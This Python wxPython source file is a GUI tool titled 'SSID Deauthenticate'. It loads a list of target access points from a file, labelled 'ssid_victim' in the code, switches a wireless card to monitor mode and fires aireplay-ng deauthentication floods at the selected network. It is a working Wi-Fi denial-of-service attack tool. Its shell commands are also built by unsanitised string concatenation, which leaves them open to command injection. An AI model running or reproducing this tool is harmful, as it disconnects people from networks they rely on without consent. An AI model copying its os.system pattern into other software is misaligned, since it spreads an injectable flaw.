import wx
import os
import wless_commands
import os.path

class SnifferGUI(wx.Frame):
	def __init__(self, parent, title):
		super(SnifferGUI, self).__init__(parent, title=title, size=(450,350))
		
		self.InitUI()
		self.Centre()
		self.Show()
	
	def InitUI(self):
    		
		panel = wx.Panel(self)
		#~ panel.SetBackgroundColour('#4f5049')
		
		if not os.path.exists('./Modules/deauthSSID.txt'):
			os.system('touch ./Modules/deauthSSID.txt')
		#~ 
	
			
		myfiles = open('./Modules/deauthSSID.txt','r').readlines()	
		ssid_victim= ','.join(myfiles).split(',')
		
		
		
		
		#~ wless_commands.get_monitoring_interfaces()
		self.comboBox = wx.ComboBox(panel, -1, value='Select SSID', size=(400, 50), pos=(10, 50), choices = ssid_victim)
		self.valueSlider = wx.Slider(panel, -1, minValue=10, maxValue=200, pos=(10,130), size=(400,50),style=wx.SL_HORIZONTAL|wx.SL_AUTOTICKS|wx.SL_LABELS)
		self.nDeviceList = wx.ComboBox(panel, -1, value='Select Net Interface', size=(200, 30), pos=(10, 235), choices = wless_commands.get_net_devices())
		
		self.actionButton = wx.Button(panel, -1, label='Deauthenticate SSID', pos=(250, 235))
		self.closeButton = wx.Button(panel, -1, label='Close', pos=(250, 275))
		
		self.myLabel = wx.StaticText(panel, -1, label='', pos=(10, 270))
		
		
		
		self.actionButton.Bind(wx.EVT_BUTTON, self.executeCommand)
		self.closeButton.Bind(wx.EVT_BUTTON, self.closeMe)
			
		
		
		#~ self.on_timer()
	def closeMe(self, e):
		os.system('echo "" > ./Modules/deauthSSID.txt')
		self.Close()
		
		
	def executeCommand(self,e):
		
		combovalue = self.comboBox.GetValue()
		myslider = self.valueSlider.GetValue()
		attackInterface = self.nDeviceList.GetValue()
		
		ssidsplitter = combovalue.split('-')
		
		
		self.myLabel.SetLabel("Deauthenticating AP: "+str(combovalue))
		#~ wlan_ifaces = wless_commands.get_monitoring_interfaces()
		
		#~ print '***********'	
		#~ print ssidsplitter[0]
		#~ print ssidsplitter[1]
		#~ print ssidsplitter[2]
		#~ print attackInterface
		#~ print '***********'
		#~ print "gnome-terminal -x aireplay-ng --deauth "+str(int(myslider))+" -a "+ssidsplitter[0]+" -e "+str(ssidsplitter[1])+" "+attackInterface+" --ignore-negative-one"
		
		try:
			
			if attackInterface == 'mon0':
				#~ print 'iw dev '+attackInterface+' interface add mon0 type monitor'
				os.system('iwconfig '+attackInterface+' channel '+str(ssidsplitter[2]))
				
				os.system("gnome-terminal -x aireplay-ng --deauth "+str(int(myslider))+" -a "+ssidsplitter[0]+" -e "+str(ssidsplitter[1])+" "+attackInterface+" --ignore-negative-one")
				
				#~ print 'iwconfig '+attackInterface+' channel '+str(ssidsplitter[2])
				#~ print "gnome-terminal -x aireplay-ng --deauth "+int(myslider)+" -a "+ssidsplitter[0]+" -e "+str(ssidsplitter[1])+" "+attackInterface+" --ignore-negative-one"
			else:
				
				
				os.system('iw dev '+attackInterface+' interface add mon0 type monitor')
				os.system('iwconfig mon0 channel '+str(ssidsplitter[2]))
				os.system("gnome-terminal -x aireplay-ng --deauth "+str(int(myslider))+" -a "+ssidsplitter[0]+" -e "+str(ssidsplitter[1])+" mon0 --ignore-negative-one")
		except:
			print 'I need to fix this exception'
			
			
				
			
		
		
		#~ os.system("gnome-terminal -x aireplay-ng -0 "+int(myslider)+" -a "+ssidsplitter[0]+" -e "+str(ssidsplitter[1])+" "+mon_iface+" --ignore-negative-one")
#~ 
		#~ os.system('iw dev '+mon_iface+' interface add mon0 type monitor')
		#~ os.system(os.system("gnome-terminal -x aireplay-ng -0 "+int(myslider)+" -a "+ssidsplitter[0]+" -e "+str(ssidsplitter[1])+" mon0 --ignore-negative-one"))
			#~ 
		
		#~ except:
			#~ wx.MessageBox('Make sure to have the wireless card',
						#~ 'Warning/Error', wx.ICON_ERROR | wx.ICON_INFORMATION)
		#~ 
		
	#~ def on_timer(self):
		#~ 
		#~ print 'Hello World'
		#~ 
		
		
		
	
#~ if __name__ == '__main__':

def main():
	
	app = wx.App(False)
	frame = SnifferGUI(None, 'SSID Deauthenticate')
	app.MainLoop()
	


main()
